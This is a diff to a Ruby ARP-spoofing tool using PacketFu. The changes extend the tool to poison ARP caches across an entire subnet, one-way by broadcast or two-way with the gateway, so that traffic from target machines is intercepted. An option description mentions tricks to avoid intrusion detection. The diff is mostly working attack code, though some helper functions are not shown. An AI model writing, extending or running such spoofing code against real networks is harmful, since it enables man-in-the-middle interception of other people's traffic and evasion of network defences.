@@ -28,11 +28,11 @@ else # Parse the command-line options
       options.verbose = v
     end
 
-    opts.on("-m", "--smart", "NOT WORKING YET Smart ARPing; attempts to monitor ARP requests from the target(s), and only reply as necessary. If not set, ARP packets are sent continuously.") do |m|
+    opts.on("-m", "--smart", "[NOT WORKING YET] Smart ARPing; attempts various tricks to avoid IDS. If not set, ARP packets are sent continuously.") do |m|
       options.smart = m
     end
 
-    opts.on("-t", "--target <target IP>", "One or more targets separated by comma (no whitespace), and/or a hyphened range. E.g. \"-t 192.168.1.10,192.168.1.50-100\". If omitted, the entire subnet will be targeted. Without [-g], one-way spoofing is performed, i.e. packets *from* the target are intercepted.") do |target|
+    opts.on("-t", "--target <target IP>", "One or more targets separated by comma (no whitespace), and/or a hyphened range. E.g. \"-t 192.168.1.10,192.168.1.50-100\". If omitted, all live targets in the entire subnet will be spoofed. Without [-g], one-way spoofing is performed, i.e. packets *from* the target are intercepted.") do |target|
       options.target = target
     end
 
@@ -131,30 +131,12 @@ if interactive
     end
   end
 
-=begin
-smart = false
-until smart 
-print "Are we smart arping? (y/n): "
-smart = gets.chomp.downcase
-if  smart == "y"
-@smart
-elsif smart == "n"
-@smart = false
-else
-smart = false
-puts "Fat-finger!"
-sleep 1
-end
-end
-=end
-
   print "Enter target IP(s): "
   target = gets.chomp
 
 # CL mode 
 else  
   @verbose  = options.verbose
-  #@smart   = options.smart
   @iface    = options.interface
   target    = options.target
   @gateway  = options.gateway
@@ -172,22 +154,21 @@ else
     exit 0
   end
 end
+broadcast = true if target.nil?
 
-if @verbose
-=begin
-if @smart
-var1 = "Smart s"
-else
-var1 = "S"
-end
-=end  
-var1 = "S"
+if @verbose  
+  var1 = "S"
   if @two_way
     var2 = "two-way with gateway #{@gateway}."
   else
     var2 = "one-way."
   end
-  puts "#{var1}poofing #{target} on #{@iface}, #{var2}"
+  if broadcast
+    var3 = "entire network"
+  else
+    var3 = target
+  end 
+  puts "#{var1}poofing #{var3} on #{@iface}, #{var2}"
 end
 
 #----------------------------------------------------------------------#
@@ -202,13 +183,24 @@ unless @gateway_mac
 end
 puts_verbose "#{@gateway}: mac is #{@gateway_mac} (Gateway)"
 
-
-# Make hash of target ips => target macs
 @targets_hash = {}
-if target.nil?
-  puts_verbose "Using broadcast address for target"
-  @targets_hash["0.0.0.0"] = "ff:ff:ff:ff:ff:ff" ###
-  
+@target_packets  = []
+@gateway_packets = []
+if broadcast
+  puts_verbose "Using broadcast address for targets"
+  build_pkt(2, "ff:ff:ff:ff:ff:ff",  @gateway, "0.0.0.0")
+  @target_packets << @arp_pkt
+  if @two_way
+    target_parse("#{(@defaults[:ip4_obj]).to_s}-255") # Make hash of network ip's, range 0-255
+    @target.each do |ip|
+      #Thread.new(ip) do |ip|
+      target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
+      @targets_hash[ip] = target_mac                  # Make hash of target ips => target macs
+      #end
+    end
+    @targets_hash.delete_if { |k, v| v.nil? }
+    @targets_hash.delete(@gateway)
+  end
 else  
   target_parse(target)
   @target.each do |ip|
@@ -217,19 +209,19 @@ else
     if target_mac
       puts_verbose "#{ip}: mac is #{target_mac}"
     else
-      puts_verbose "#{ip}: is down"
+      puts_verbose "#{ip}: is down, can't spoof"
     end
   end
-end
-@targets_hash.delete_if { |k, v| v.nil? }
+  @targets_hash.delete_if { |k, v| v.nil? }
+  end ### need to tell self real gateway?
 
 # Make arrays of packets for targets and gateway
 # Args for build_pkt are: op_code, dest_mac, source_ip, dest_ip
-@target_packets  = []
-@gateway_packets = []
-@targets_hash.each do |target, target_mac|
-  build_pkt(2, target_mac, @gateway, target)
-  @target_packets << @arp_pkt
+unless broadcast  # Have already made target packets (broadcast)
+  @targets_hash.each do |target, target_mac|
+    build_pkt(2, target_mac, @gateway, target)
+    @target_packets << @arp_pkt
+  end
 end
 if @two_way
   @targets_hash.each do |target, |
@@ -251,7 +243,6 @@ while send_packets
       end
     end
     GC.start   # to deal with "memory leak" (more likely a problem calling GC)
-    sleep 1.5
+    sleep 2
   end
 end
-
